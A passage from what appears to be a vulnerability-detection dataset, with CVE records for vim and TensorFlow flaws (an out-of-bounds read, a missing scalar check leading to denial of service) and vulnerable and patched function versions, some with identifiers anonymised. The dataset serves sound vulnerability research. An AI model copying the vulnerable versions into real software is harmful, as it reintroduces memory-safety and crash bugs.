	if (VAR_2->w_p_pvw || bt_quickfix(VAR_2->w_buffer))
	{
	    /* COMMENT_38 */
                                                                     
                                        
        
	    for (;;)
	    {
		if (VAR_2->w_next == NULL)
		    VAR_2 = VAR_21;
		else
		    VAR_2 = VAR_2->w_next;
		if (VAR_2 == VAR_26)
		    break;
		if (!VAR_2->w_p_pvw && !bt_quickfix(VAR_2->w_buffer))
		{
		    VAR_26 = VAR_2;
		    break;
		}
	    }
	}
#endif
	VAR_28 = VAR_26->w_buffer;
	VAR_4 = TRUE;

	/* COMMENT_42 */
	/* COMMENT_43 */
	check_cursor();
    }
    if (VAR_39 && (*VAR_40 == 'b' || *VAR_40 == VAR_5))
	/* COMMENT_44 */
	/* COMMENT_45 */
	win_equal(VAR_26, VAR_26->w_frame->fr_parent == VAR_9, VAR_5);
    else
	win_comp_pos();
    if (VAR_4)
    {
	/* COMMENT_46 */
	/* COMMENT_47 */
#ifdef VAR_12
	VAR_13 =
#else
	(void)
#endif
	    win_enter_ext(VAR_2,
		VAR_41 | VAR_42
		      | VAR_43 | VAR_44);
	if (VAR_3)
	    /* COMMENT_48 */
	    apply_autocmds(VAR_45, NULL, NULL, FALSE, VAR_28);
    }

    --VAR_35;
#ifdef VAR_12
    if (!VAR_13)
	--VAR_36;
#endif

    /* COMMENT_49 */
                                                                  
                              
       
    last_status(FALSE);

    /* COMMENT_53 */
    /* COMMENT_54 */
    if (VAR_6)
	restore_snapshot(VAR_25, VAR_4);

#ifdef VAR_10
    /* COMMENT_55 */
    /* COMMENT_56 */
    /* COMMENT_57 */
    if (diffopt_closeoff() && VAR_11 && VAR_8 == VAR_7)
    {
	int	VAR_46 = 0;
	win_T	*VAR_47;

	VAR_48(dwin)
	    if (dwin->VAR_49)
		++VAR_46;
	if (VAR_46 == 1)
	    do_cmdline_cmd((char_u *)""diffoff!"");
    }
#endif

#if defined(VAR_32)
    /* COMMENT_58 */
    if (VAR_33.in_use && !win_hasvertsplit())
	gui_init_which_components(NULL);
#endif

    redraw_all_later(VAR_50);
    return VAR_16;
}",vim/3d51ce18ab1be4f9f6061568a4e7fabf00b21794/window.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -73,6 +73,8 @@
 	 */
 	if (wp->w_buffer != curbuf)
 	{
+	    reset_VIsual_and_resel();	// stop Visual mode
+
 	    other_buffer = TRUE;
 	    win->w_closing = TRUE;
 	    apply_autocmds(EVENT_BUFLEAVE, NULL, NULL, FALSE, curbuf);","{'deleted_lines': [], 'added_lines': ['\t    reset_VIsual_and_resel();\t// stop Visual mode', '']}",True,Heap-based Buffer Overflow in GitHub repository vim/vim prior to 9.0.,7.8,HIGH,2,valid,2022-07-01T14:26:15Z,4
CVE-2022-2286,['CWE-125'],AV:N/AC:M/Au:N/C:P/I:P/A:P,0,vim,"patch 9.0.0020: with some completion reading past end of string

Problem:    With some completion reading past end of string.
Solution:   Check the length of the string.",f12129f1714f7d2301935bb21d896609bdac221c,https://github.com/vim/vim/commit/f12129f1714f7d2301935bb21d896609bdac221c,src/insexpand.c,ins_compl_stop,"static int
ins_compl_stop(int c, int prev_mode, int retval)
{
char_u*ptr;
intwant_cindent;
if (compl_curr_match != NULL || compl_leader != NULL || c == Ctrl_E)
{
if (compl_curr_match != NULL && compl_used_match && c != Ctrl_E)
ptr = compl_curr_match->cp_str;
else
ptr = NULL;
ins_compl_fixRedoBufForLeader(ptr);
}
want_cindent = (get_can_cindent() && cindent_on());
if (compl_cont_mode == CTRL_X_WHOLE_LINE)
{
if (want_cindent)
{
do_c_expr_indent();
want_cindent = FALSE;}
}
else
{
int prev_col = curwin->w_cursor.col;
if (prev_col > 0)
dec_cursor();
if (!arrow_used && !ins_need_undo_get() && c != Ctrl_E)
insertchar(NUL, 0, -1);
if (prev_col > 0
&& ml_get_curline()[curwin->w_cursor.col] != NUL)
inc_cursor();
}
if ((c == Ctrl_Y || (compl_enter_selects
&& (c == CAR || c == K_KENTER || c == NL)))
&& pum_visible())
retval = TRUE;
if (c == Ctrl_E)
{
ins_compl_delete();
if (compl_leader != NULL)
ins_bytes(compl_leader + get_compl_len());
else if (compl_first_match != NULL)
ins_bytes(compl_orig_text + get_compl_len());
retval = TRUE;
}
auto_format(FALSE, TRUE);
ctrl_x_mode = prev_mode;
ins_apply_autocmds(EVENT_COMPLETEDONEPRE);
ins_compl_free();
compl_started = FALSE;
compl_matches = 0;
if (!shortmess(SHM_COMPLETIONMENU))
msg_clr_cmdline();    ctrl_x_mode = CTRL_X_NORMAL;
compl_enter_selects = FALSE;
if (edit_submode != NULL)
{
edit_submode = NULL;
showmode();
}
#ifdef FEAT_CMDWIN
if (c == Ctrl_C && cmdwin_type != 0)
update_screen(0);
#endif
if (want_cindent && in_cinkeys(KEY_COMPLETE, ' ', inindent(0)))
do_c_expr_indent();
ins_apply_autocmds(EVENT_COMPLETEDONE);
return retval;
}","static int
ins_compl_stop(int VAR_0, int VAR_1, int VAR_2)
{
char_u*VAR_3;
intVAR_4;
if (VAR_5 != NULL || VAR_6 != NULL || VAR_0 == VAR_7)
{
if (VAR_5 != NULL && VAR_8 && VAR_0 != VAR_7)
VAR_3 = VAR_5->cp_str;
else
VAR_3 = NULL;
ins_compl_fixRedoBufForLeader(VAR_3);
}
VAR_4 = (get_can_cindent() && cindent_on());
if (VAR_9 == VAR_10)
{
if (VAR_4)
{
do_c_expr_indent();
VAR_4 = FALSE;
}
}
else
{
int VAR_11 = VAR_12->w_cursor.col;
if (VAR_11 > 0)
dec_cursor();
if (!VAR_13 && !ins_need_undo_get() && VAR_0 != VAR_7)
insertchar(VAR_14, 0, -1);
if (VAR_11 > 0
&& ml_get_curline()[VAR_12->w_cursor.col] != VAR_14)
inc_cursor();
}
if ((VAR_0 == VAR_15 || (VAR_16
&& (VAR_0 == VAR_17 || VAR_0 == VAR_18 || VAR_0 == VAR_19)))
&& pum_visible())
VAR_2 = TRUE;
if (VAR_0 == VAR_7)
{
ins_compl_delete();
if (VAR_6 != NULL)
ins_bytes(VAR_6 + get_compl_len());
else if (VAR_20 != NULL)
ins_bytes(VAR_21 + get_compl_len());
VAR_2 = TRUE;
}
auto_format(FALSE, TRUE);
VAR_22 = VAR_1;
ins_apply_autocmds(VAR_23);
ins_compl_free();
VAR_24 = FALSE;
VAR_25 = 0;
if (!shortmess(VAR_26))
msg_clr_cmdline();
VAR_22 = VAR_27;
VAR_16 = FALSE;
if (VAR_28 != NULL)
{
VAR_28 = NULL;
showmode();
}
#ifdef VAR_29
if (VAR_0 == VAR_30 && VAR_31 != 0)
update_screen(0);
#endif
if (VAR_4 && in_cinkeys(VAR_32, ' ', inindent(0)))
do_c_expr_indent();
ins_apply_autocmds(VAR_33);
return VAR_2;
}",vim/f12129f1714f7d2301935bb21d896609bdac221c/insexpand.c/vul/before/0.json,"static int
ins_compl_stop(int c, int prev_mode, int retval)
{
    char_u	*ptr;
    int		want_cindent;

    // Get here when we have finished typing a sequence of ^N and
    // ^P or other completion characters in CTRL-X mode.  Free up
    // memory that was used, and make sure we can redo the insert.
    if (compl_curr_match != NULL || compl_leader != NULL || c == Ctrl_E)
    {
	// If any of the original typed text has been changed, eg when
	// ignorecase is set, we must add back-spaces to the redo
	// buffer.  We add as few as necessary to delete just the part
	// of the original text that has changed.
	// When using the longest match, edited the match or used
	// CTRL-E then don't use the current match.
	if (compl_curr_match != NULL && compl_used_match && c != Ctrl_E)
	    ptr = compl_curr_match->cp_str;
	else
	    ptr = NULL;
	ins_compl_fixRedoBufForLeader(ptr);
    }

    want_cindent = (get_can_cindent() && cindent_on());

    // When completing whole lines: fix indent for 'cindent'.
    // Otherwise, break line if it's too long.
    if (compl_cont_mode == CTRL_X_WHOLE_LINE)
    {
	// re-indent the current line
	if (want_cindent)
	{
	    do_c_expr_indent();
	    want_cindent = FALSE;	// don't do it again
	}
    }
    else
    {
	int prev_col = curwin->w_cursor.col;

	// put the cursor on the last char, for 'tw' formatting
	if (prev_col > 0)
	    dec_cursor();
	// only format when something was inserted
	if (!arrow_used && !ins_need_undo_get() && c != Ctrl_E)
	    insertchar(NUL, 0, -1);
	if (prev_col > 0
		&& ml_get_curline()[curwin->w_cursor.col] != NUL)
	    inc_cursor();
    }

    // If the popup menu is displayed pressing CTRL-Y means accepting
    // the selection without inserting anything.  When
    // compl_enter_selects is set the Enter key does the same.
    if ((c == Ctrl_Y || (compl_enter_selects
		    && (c == CAR || c == K_KENTER || c == NL)))
	    && pum_visible())
	retval = TRUE;

    // CTRL-E means completion is Ended, go back to the typed text.
    // but only do this, if the Popup is still visible
    if (c == Ctrl_E)
    {
	char_u *p = NULL;

	ins_compl_delete();
	if (compl_leader != NULL)
	    p = compl_leader;
	else if (compl_first_match != NULL)
	    p = compl_orig_text;
	if (p != NULL)
	{
	    int	    compl_len = get_compl_len();
	    int	    len = (int)STRLEN(p);

	    if (len > compl_len)
		ins_bytes_len(p + compl_len, len - compl_len);
	}
	retval = TRUE;
    }

    auto_format(FALSE, TRUE);

    // Trigger the CompleteDonePre event to give scripts a chance to
    // act upon the completion before clearing the info, and restore
    // ctrl_x_mode, so that complete_info() can be used.
    ctrl_x_mode = prev_mode;
    ins_apply_autocmds(EVENT_COMPLETEDONEPRE);

    ins_compl_free();
    compl_started = FALSE;
    compl_matches = 0;
    if (!shortmess(SHM_COMPLETIONMENU))
	msg_clr_cmdline();	// necessary for ""noshowmode""
    ctrl_x_mode = CTRL_X_NORMAL;
    compl_enter_selects = FALSE;
    if (edit_submode != NULL)
    {
	edit_submode = NULL;
	showmode();
    }

#ifdef FEAT_CMDWIN
    if (c == Ctrl_C && cmdwin_type != 0)
	// Avoid the popup menu remains displayed when leaving the
	// command line window.
	update_screen(0);
#endif
    // Indent now if a key was typed that is in 'cinkeys'.
    if (want_cindent && in_cinkeys(KEY_COMPLETE, ' ', inindent(0)))
	do_c_expr_indent();
    // Trigger the CompleteDone event to give scripts a chance to act
    // upon the end of completion.
    ins_apply_autocmds(EVENT_COMPLETEDONE);

    return retval;
}","static int
ins_compl_stop(int VAR_0, int VAR_1, int VAR_2)
{
    char_u	*VAR_3;
    int		VAR_4;

    /* COMMENT_0 */
    /* COMMENT_1 */
    /* COMMENT_2 */
    if (VAR_5 != NULL || VAR_6 != NULL || VAR_0 == VAR_7)
    {
	/* COMMENT_3 */
	/* COMMENT_4 */
	/* COMMENT_5 */
	/* COMMENT_6 */
	/* COMMENT_7 */
	/* COMMENT_8 */
	if (VAR_5 != NULL && VAR_8 && VAR_0 != VAR_7)
	    VAR_3 = VAR_5->cp_str;
	else
	    VAR_3 = NULL;
	ins_compl_fixRedoBufForLeader(VAR_3);
    }

    VAR_4 = (get_can_cindent() && cindent_on());

    /* COMMENT_9 */
    /* COMMENT_10 */
    if (VAR_9 == VAR_10)
    {
	/* COMMENT_11 */
	if (VAR_4)
	{
	    do_c_expr_indent();
	    VAR_4 = FALSE;	/* COMMENT_12 */
	}
    }
    else
    {
	int VAR_11 = VAR_12->w_cursor.col;

	/* COMMENT_13 */
	if (VAR_11 > 0)
	    dec_cursor();
	/* COMMENT_14 */
	if (!VAR_13 && !ins_need_undo_get() && VAR_0 != VAR_7)
	    insertchar(VAR_14, 0, -1);
	if (VAR_11 > 0
		&& ml_get_curline()[VAR_12->w_cursor.col] != VAR_14)
	    inc_cursor();
    }

    /* COMMENT_15 */
    /* COMMENT_16 */
    /* COMMENT_17 */
    if ((VAR_0 == VAR_15 || (VAR_16
		    && (VAR_0 == VAR_17 || VAR_0 == VAR_18 || VAR_0 == VAR_19)))
	    && pum_visible())
	VAR_2 = TRUE;

    /* COMMENT_18 */
    /* COMMENT_19 */
    if (VAR_0 == VAR_7)
    {
	char_u *VAR_20 = NULL;

	ins_compl_delete();
	if (VAR_6 != NULL)
	    VAR_20 = VAR_6;
	else if (VAR_21 != NULL)
	    VAR_20 = VAR_22;
	if (VAR_20 != NULL)
	{
	    int	    VAR_23 = get_compl_len();
	    int	    VAR_24 = (int)STRLEN(VAR_20);

	    if (VAR_24 > VAR_23)
		ins_bytes_len(VAR_20 + VAR_23, VAR_24 - VAR_23);
	}
	VAR_2 = TRUE;
    }

    auto_format(FALSE, TRUE);

    /* COMMENT_20 */
    /* COMMENT_21 */
    /* COMMENT_22 */
    VAR_25 = VAR_1;
    ins_apply_autocmds(VAR_26);

    ins_compl_free();
    VAR_27 = FALSE;
    VAR_28 = 0;
    if (!shortmess(VAR_29))
	msg_clr_cmdline();	/* COMMENT_23 */
    VAR_25 = VAR_30;
    VAR_16 = FALSE;
    if (VAR_31 != NULL)
    {
	VAR_31 = NULL;
	showmode();
    }

#ifdef VAR_32
    if (VAR_0 == VAR_33 && VAR_34 != 0)
	/* COMMENT_24 */
	/* COMMENT_25 */
	update_screen(0);
#endif
    /* COMMENT_26 */
    if (VAR_4 && in_cinkeys(VAR_35, ' ', inindent(0)))
	do_c_expr_indent();
    /* COMMENT_27 */
    /* COMMENT_28 */
    ins_apply_autocmds(VAR_36);

    return VAR_2;
}",vim/f12129f1714f7d2301935bb21d896609bdac221c/insexpand.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -62,11 +62,21 @@
     // but only do this, if the Popup is still visible
     if (c == Ctrl_E)
     {
+	char_u *p = NULL;
+
 	ins_compl_delete();
 	if (compl_leader != NULL)
-	    ins_bytes(compl_leader + get_compl_len());
+	    p = compl_leader;
 	else if (compl_first_match != NULL)
-	    ins_bytes(compl_orig_text + get_compl_len());
+	    p = compl_orig_text;
+	if (p != NULL)
+	{
+	    int	    compl_len = get_compl_len();
+	    int	    len = (int)STRLEN(p);
+
+	    if (len > compl_len)
+		ins_bytes_len(p + compl_len, len - compl_len);
+	}
 	retval = TRUE;
     }
 ","{'deleted_lines': ['\t    ins_bytes(compl_leader + get_compl_len());', '\t    ins_bytes(compl_orig_text + get_compl_len());'], 'added_lines': ['\tchar_u *p = NULL;', '', '\t    p = compl_leader;', '\t    p = compl_orig_text;', '\tif (p != NULL)', '\t{', '\t    int\t    compl_len = get_compl_len();', '\t    int\t    len = (int)STRLEN(p);', '', '\t    if (len > compl_len)', '\t\tins_bytes_len(p + compl_len, len - compl_len);', '\t}']}",True,Out-of-bounds Read in GitHub repository vim/vim prior to 9.0.,7.8,HIGH,2,valid,2022-07-01T18:58:30Z,4
CVE-2022-36002,['CWE-617'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,tensorflow,"Fix check failure in Unbatch Op kernel by checking whether input argument is a scalar before trying to extract value.

PiperOrigin-RevId: 461660186",4419d10d576adefa36b0e0a9425d2569f7c0189f,https://github.com/tensorflow/tensorflow/commit/4419d10d576adefa36b0e0a9425d2569f7c0189f,tensorflow/core/kernels/batch_kernels.cc,Compute,"Status Compute(OpKernelContext* context, AsyncOpKernel::DoneCallback done) {
const Tensor& data_t = context->input(0);
const Tensor& batch_index_t = context->input(1);
if (batch_index_t.shape().dim_size(0) > data_t.shape().dim_size(0)) {
return errors::InvalidArgument(
""Wrong shape for index tensor. Expected 0th dimension size to be no ""
""greater than "",
data_t.shape().dim_size(0),
""; Got: "", batch_index_t.shape().dim_size(0), ""."");
}
if (batch_index_t.shape().dim_size(1) != 3) {
return errors::InvalidArgument(
""Wrong shape for index tensor. Expected 1st dimension size to be 3 ; ""
""Got: "",
batch_index_t.shape().dim_size(1), ""."");
}
const int64_t batch_key = context->input(2).scalar<int64_t>()();
const bool nonempty_input = batch_index_t.dim_size(0) > 0;
std::vector<int64_t> sizes;
std::vector<int64_t> batch_keys;
std::vector<Tensor> split_inputs;
if (nonempty_input) {
auto batch_indices =
batch_index_t.shaped<int64_t, 2>({batch_index_t.dim_size(0), 3});
for (int i = 0; i < batch_index_t.dim_size(0); ++i) {
sizes.push_back(batch_indices(i, 2) - batch_indices(i, 1));
batch_keys.push_back(batch_indices(i, 0));
}
TF_RETURN_IF_ERROR(Split(context, data_t, sizes, &split_inputs));
}
std::vector<AsyncOpKernel::DoneCallback> done_callbacks_to_call;
Status status = [&]() -> Status {
mutex_lock ml(mu_);
auto tensor_it = waiting_tensors_.find(batch_key);
if (tensor_it != waiting_tensors_.end()) {
context->set_output(0, tensor_it->second.tensor);
waiting_tensors_.erase(tensor_it);
done_callbacks_to_call.push_back(done);
return OkStatus();
}
const uint64 deadline_micros =
Env::Default()->NowMicros() + timeout_micros_;
if (!waiting_callbacks_
.emplace(batch_key,
WaitingCallback{deadline_micros, context, done})
.second) {
return errors::AlreadyExists(
""Multiple session runs with the same batch key."");
}
if (nonempty_input) {
for (size_t i = 0; i < batch_keys.size(); ++i) {
auto runs_it = waiting_callbacks_.find(batch_keys[i]);
if (runs_it != waiting_callbacks_.end()) {
runs_it->second.context->set_output(0, split_inputs[i]);
done_callbacks_to_call.push_back(runs_it->second.done);
waiting_callbacks_.erase(runs_it);
} else {
if (!waiting_tensors_
.emplace(batch_keys[i],
WaitingTensor{deadline_micros, split_inputs[i]})
.second) {
return errors::AlreadyExists(
""Multiple tensors returned for same batch key."");
}
}
}
}
return OkStatus();
}();
for (const AsyncOpKernel::DoneCallback& done_callback :
done_callbacks_to_call) {
done_callback();
}
return status;
}","Status Compute(OpKernelContext* VAR_0, AsyncOpKernel::DoneCallback VAR_1) {
const Tensor& VAR_2 = VAR_0->input(0);
const Tensor& VAR_3 = VAR_0->input(1);
if (VAR_3.shape().dim_size(0) > VAR_2.shape().dim_size(0)) {
return errors::InvalidArgument(
""Wrong shape for index tensor. Expected 0th dimension size to be no ""
""greater than "",
VAR_2.shape().dim_size(0),
""; Got: "", VAR_3.shape().dim_size(0), ""."");
}
if (VAR_3.shape().dim_size(1) != 3) {
return errors::InvalidArgument(
""Wrong shape for index tensor. Expected 1st dimension size to be 3 ; ""
""Got: "",
VAR_3.shape().dim_size(1), ""."");
}
const int64_t VAR_4 = VAR_0->input(2).scalar<int64_t>()();
const bool VAR_5 = VAR_3.dim_size(0) > 0;
std::vector<int64_t> VAR_6;
std::vector<int64_t> VAR_7;
std::vector<Tensor> VAR_8;
if (VAR_5) {
auto VAR_9 =
VAR_3.shaped<int64_t, 2>({VAR_3.dim_size(0), 3});
for (int VAR_10 = 0; VAR_10 < VAR_3.dim_size(0); ++VAR_10) {
VAR_6.push_back(VAR_9(VAR_10, 2) - VAR_9(VAR_10, 1));
VAR_7.push_back(VAR_9(VAR_10, 0));
}
TF_RETURN_IF_ERROR(Split(VAR_0, VAR_2, VAR_6, &VAR_8));
}
std::vector<AsyncOpKernel::DoneCallback> VAR_11;
Status VAR_12 = [&]() -> Status {
mutex_lock ml(mu_);
auto VAR_13 = VAR_14.find(VAR_4);
if (VAR_13 != VAR_14.end()) {
VAR_0->set_output(0, VAR_13->second.tensor);
VAR_14.erase(VAR_13);
VAR_11.push_back(VAR_1);
return OkStatus();
}
const uint64 VAR_15 =
Env::Default()->NowMicros() + VAR_16;
if (!VAR_17
.emplace(VAR_4,
WaitingCallback{VAR_15, VAR_0, VAR_1})
.second) {
return errors::AlreadyExists(
""Multiple session runs with the same batch key."");
}
if (VAR_5) {
for (size_t VAR_10 = 0; VAR_10 < VAR_7.size(); ++VAR_10) {
auto VAR_18 = VAR_17.find(VAR_7[VAR_10]);
if (VAR_18 != VAR_17.end()) {
VAR_18->second.context->set_output(0, VAR_8[VAR_10]);
VAR_11.push_back(VAR_18->second.done);
VAR_17.erase(VAR_18);
} else {
if (!VAR_14
.emplace(VAR_7[VAR_10],
WaitingTensor{VAR_15, VAR_8[VAR_10]})
.second) {
return errors::AlreadyExists(
""Multiple tensors returned for same batch key."");
}
}
}
}
return OkStatus();
}();
for (const AsyncOpKernel::DoneCallback& VAR_19 :
VAR_11) {
VAR_19();
}
return VAR_12;
}",tensorflow/4419d10d576adefa36b0e0a9425d2569f7c0189f/batch_kernels.cc/vul/before/0.json,"Status Compute(OpKernelContext* context, AsyncOpKernel::DoneCallback done) {
    const Tensor& data_t = context->input(0);
    const Tensor& batch_index_t = context->input(1);

    if (batch_index_t.shape().dim_size(0) > data_t.shape().dim_size(0)) {
      return errors::InvalidArgument(
          ""Wrong shape for index tensor. Expected 0th dimension size to be no ""
          ""greater than "",
          data_t.shape().dim_size(0),
          ""; Got: "", batch_index_t.shape().dim_size(0), ""."");
    }
    if (batch_index_t.shape().dim_size(1) != 3) {
      return errors::InvalidArgument(
          ""Wrong shape for index tensor. Expected 1st dimension size to be 3 ; ""
          ""Got: "",
          batch_index_t.shape().dim_size(1), ""."");
    }

    if (!TensorShapeUtils::IsScalar(context->input(2).shape())) {
      return errors::InvalidArgument(
          ""Input id should be scalar; ""
          ""Got: "",
          context->input(2).DebugString(), ""."");
    }
    const int64_t batch_key = context->input(2).scalar<int64_t>()();
    const bool nonempty_input = batch_index_t.dim_size(0) > 0;

    // If we have a non-empty tensor, slice it up.
    // (It is important to do this outside of the critical section below.)
    // The following variables are populated iff 'nonempty_input==true'.
    std::vector<int64_t> sizes;
    std::vector<int64_t> batch_keys;
    std::vector<Tensor> split_inputs;
    if (nonempty_input) {
      auto batch_indices =
          batch_index_t.shaped<int64_t, 2>({batch_index_t.dim_size(0), 3});
      for (int i = 0; i < batch_index_t.dim_size(0); ++i) {
        sizes.push_back(batch_indices(i, 2) - batch_indices(i, 1));
        batch_keys.push_back(batch_indices(i, 0));
      }

      TF_RETURN_IF_ERROR(Split(context, data_t, sizes, &split_inputs));
    }

    // Critical section.
    std::vector<AsyncOpKernel::DoneCallback> done_callbacks_to_call;
    Status status = [&]() -> Status {
      mutex_lock ml(mu_);

      // Check to see whether the tensor we want is already ready.
      auto tensor_it = waiting_tensors_.find(batch_key);
      if (tensor_it != waiting_tensors_.end()) {
        context->set_output(0, tensor_it->second.tensor);
        waiting_tensors_.erase(tensor_it);
        done_callbacks_to_call.push_back(done);
        return OkStatus();
      }

      const uint64 deadline_micros =
          Env::Default()->NowMicros() + timeout_micros_;

      // Add ourselves to the waitlist for tensors.
      if (!waiting_callbacks_
               .emplace(batch_key,
                        WaitingCallback{deadline_micros, context, done})
               .second) {
        return errors::AlreadyExists(
            ""Multiple session runs with the same batch key."");
      }

      // If we have a non-empty tensor, finish the waitlisted runs,
      // and store any remaining pieces.
      if (nonempty_input) {
        for (size_t i = 0; i < batch_keys.size(); ++i) {
          auto runs_it = waiting_callbacks_.find(batch_keys[i]);
          if (runs_it != waiting_callbacks_.end()) {
            runs_it->second.context->set_output(0, split_inputs[i]);
            done_callbacks_to_call.push_back(runs_it->second.done);
            waiting_callbacks_.erase(runs_it);
          } else {
            // Note: the deadline here is in case we are arriving late and the
            // kernel that should rendezvous with this tensor has already waited
            // and timed out.
            if (!waiting_tensors_
                     .emplace(batch_keys[i],
                              WaitingTensor{deadline_micros, split_inputs[i]})
                     .second) {
              return errors::AlreadyExists(
                  ""Multiple tensors returned for same batch key."");
            }
          }
        }
      }

      return OkStatus();
    }();

    for (const AsyncOpKernel::DoneCallback& done_callback :
         done_callbacks_to_call) {
      done_callback();
    }

    return status;
  }","Status Compute(OpKernelContext* VAR_0, AsyncOpKernel::DoneCallback VAR_1) {
    const Tensor& VAR_2 = VAR_0->input(0);
    const Tensor& VAR_3 = VAR_0->input(1);

    if (VAR_3.shape().dim_size(0) > VAR_2.shape().dim_size(0)) {
      return errors::InvalidArgument(
          ""Wrong shape for index tensor. Expected 0th dimension size to be no ""
          ""greater than "",
          VAR_2.shape().dim_size(0),
          ""; Got: "", VAR_3.shape().dim_size(0), ""."");
    }
    if (VAR_3.shape().dim_size(1) != 3) {
      return errors::InvalidArgument(
          ""Wrong shape for index tensor. Expected 1st dimension size to be 3 ; ""
          ""Got: "",
          VAR_3.shape().dim_size(1), ""."");
    }

    if (!TensorShapeUtils::IsScalar(VAR_0->input(2).shape())) {
      return errors::InvalidArgument(
          ""Input id should be scalar; ""
          ""Got: "",
          VAR_0->input(2).DebugString(), ""."");
    }
    const int64_t VAR_4 = VAR_0->input(2).scalar<int64_t>()();
    const bool VAR_5 = VAR_3.dim_size(0) > 0;

    /* COMMENT_0 */
    /* COMMENT_1 */
    /* COMMENT_2 */
    std::vector<int64_t> VAR_6;
    std::vector<int64_t> VAR_7;
    std::vector<Tensor> VAR_8;
    if (VAR_5) {
      auto VAR_9 =
          VAR_3.shaped<int64_t, 2>({VAR_3.dim_size(0), 3});
      for (int VAR_10 = 0; VAR_10 < VAR_3.dim_size(0); ++VAR_10) {
        VAR_6.push_back(VAR_9(VAR_10, 2) - VAR_9(VAR_10, 1));
        VAR_7.push_back(VAR_9(VAR_10, 0));
      }

      TF_RETURN_IF_ERROR(Split(VAR_0, VAR_2, VAR_6, &VAR_8));
    }

    /* COMMENT_3 */
    std::vector<AsyncOpKernel::DoneCallback> VAR_11;
    Status VAR_12 = [&]() -> Status {
      mutex_lock ml(mu_);

      /* COMMENT_4 */
      auto VAR_13 = VAR_14.find(VAR_4);
      if (VAR_13 != VAR_14.end()) {
        VAR_0->set_output(0, VAR_13->second.tensor);
        VAR_14.erase(VAR_13);
        VAR_11.push_back(VAR_1);
        return OkStatus();
      }

      const uint64 VAR_15 =
          Env::Default()->NowMicros() + VAR_16;

      /* COMMENT_5 */
      if (!VAR_17
               .emplace(VAR_4,
                        WaitingCallback{VAR_15, VAR_0, VAR_1})
               .second) {
        return errors::AlreadyExists(
            ""Multiple session runs with the same batch key."");
      }

      /* COMMENT_6 */
      /* COMMENT_7 */
      if (VAR_5) {
        for (size_t VAR_10 = 0; VAR_10 < VAR_7.size(); ++VAR_10) {
          auto VAR_18 = VAR_17.find(VAR_7[VAR_10]);
          if (VAR_18 != VAR_17.end()) {
            VAR_18->second.context->set_output(0, VAR_8[VAR_10]);
            VAR_11.push_back(VAR_18->second.done);
            VAR_17.erase(VAR_18);
          } else {
            /* COMMENT_8 */
            /* COMMENT_9 */
            /* COMMENT_10 */
            if (!VAR_14
                     .emplace(VAR_7[VAR_10],
                              WaitingTensor{VAR_15, VAR_8[VAR_10]})
                     .second) {
              return errors::AlreadyExists(
                  ""Multiple tensors returned for same batch key."");
            }
          }
        }
      }

      return OkStatus();
    }();

    for (const AsyncOpKernel::DoneCallback& VAR_19 :
         VAR_11) {
      VAR_19();
    }

    return VAR_12;
  }",tensorflow/4419d10d576adefa36b0e0a9425d2569f7c0189f/batch_kernels.cc/vul/after/0.json,"--- func_before
+++ func_after
@@ -16,6 +16,12 @@
           batch_index_t.shape().dim_size(1), ""."");
     }
 
+    if (!TensorShapeUtils::IsScalar(context->input(2).shape())) {
+      return errors::InvalidArgument(
+          ""Input id should be scalar; ""
+          ""Got: "",
+          context->input(2).DebugString(), ""."");
+    }
     const int64_t batch_key = context->input(2).scalar<int64_t>()();
     const bool nonempty_input = batch_index_t.dim_size(0) > 0;
 ","{'deleted_lines': [], 'added_lines': ['    if (!TensorShapeUtils::IsScalar(context->input(2).shape())) {', '      return errors::InvalidArgument(', '          ""Input id should be scalar; ""', '          ""Got: "",', '          context->input(2).DebugString(), ""."");', '    }']}",True,"TensorFlow is an open source platform for machine learning. When `Unbatch` receives a nonscalar input `id`, it gives a `CHECK` fail that can trigger a denial of service attack. We have patched the issue in GitHub commit 4419d10d576adefa36b0e0a9425d2569f7c0189f. The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range. There are no known workarounds for this issue.",5.9,MEDIUM,1,valid,2022-07-18T17:48:37Z,4
CVE-2022-35999,['CWE-617'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,tensorflow,"Fix GPU/CPU Conv2DBackpropInputOp check error.

For empty `out_backprop` inputs (e.g. `[3, 1, 0, 1]`), the current
CPU/GPU kernels fail (one with dnnl, the other with cudnn). Added
a shortcut path to return a zero input.

Note that the XLA test currently fails due to an incorrect result
size bug (b/239598470), so it is currently disabled.

PiperOrigin-RevId: 462217998",27a65a43cf763897fecfa5cdb5cc653fc5dd0346,https://github.com/tensorflow/tensorflow/commit/27a65a43cf763897fecfa5cdb5cc653fc5dd0346,tensorflow/core/kernels/conv_grad_input_ops.h,Compute,"void Compute(OpKernelContext* context) override {
const Tensor& input_sizes = context->input(0);
const Tensor& filter = context->input(1);
const Tensor& out_backprop = context->input(2);
TensorShape input_shape;
OP_REQUIRES_OK(context,
Conv2DBackpropComputeInputShape(input_sizes, filter.shape(),
out_backprop.shape(),
data_format_, &input_shape));
ConvBackpropDimensions dims;
OP_REQUIRES_OK(context,
ConvBackpropComputeDimensionsV2(
""Conv2DCustomBackpropInput"", 2,
input_shape, filter.shape(), out_backprop.shape(),
{1, 1, 1, 1}, strides_, padding_,
explicit_paddings_, data_format_, &dims));
OP_REQUIRES(context, dims.in_depth == filter.shape().dim_size(2),
errors::InvalidArgument(
""Gradients for grouped convolutions are not ""
""supported on CPU. Please file a feature request if you ""
""run into this issue. Computed input depth "",
dims.in_depth, "" doesn't match filter input depth "",
filter.shape().dim_size(2)));
OP_REQUIRES(
context, dims.out_depth == filter.shape().dim_size(3),
errors::InvalidArgument(""Computed output depth "", dims.out_depth,
"" doesn't match filter output depth "",
filter.shape().dim_size(3)));
Tensor* in_backprop = nullptr;
OP_REQUIRES_OK(context,
context->allocate_output(0, input_shape, &in_backprop));
if (input_shape.num_elements() == 0) {
return;
}
#if defined TENSORFLOW_USE_LIBXSMM_CONVOLUTIONS && \
defined TENSORFLOW_USE_LIBXSMM_BACKWARD_CONVOLUTIONS
int64 pad_top, pad_bottom;
int64 pad_left, pad_right;
OP_REQUIRES_OK(
context,
GetWindowedOutputSizeVerbose(
dims.spatial_dims[0].input_size, dims.spatial_dims[0].filter_size,
dims.spatial_dims[0].stride, padding_,
&dims.spatial_dims[0].output_size, &pad_top, &pad_bottom));
